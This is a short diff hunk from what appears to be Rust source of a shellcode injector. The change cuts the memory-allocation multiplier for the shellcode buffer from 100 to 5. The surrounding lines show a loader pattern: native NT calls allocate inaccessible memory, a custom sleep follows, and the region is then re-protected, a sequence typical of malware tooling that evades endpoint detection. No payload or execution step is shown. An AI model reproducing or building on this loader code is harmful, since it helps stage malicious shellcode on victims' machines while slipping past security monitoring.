@@ -22,7 +22,7 @@ impl Injector {
             let mut protect = PAGE_NOACCESS.0;
             let mut map_ptr: *mut c_void = std::ptr::null_mut();
             // asking for more than needed, because we can afford it
-            let mut sc_len = self.shellcode.len() * 100;
+            let mut sc_len = self.shellcode.len() * 5;
             NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut sc_len, MEM_COMMIT.0 | MEM_RESERVE.0, protect);
             custom_sleep(100);
             NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_READWRITE.0, &mut protect);
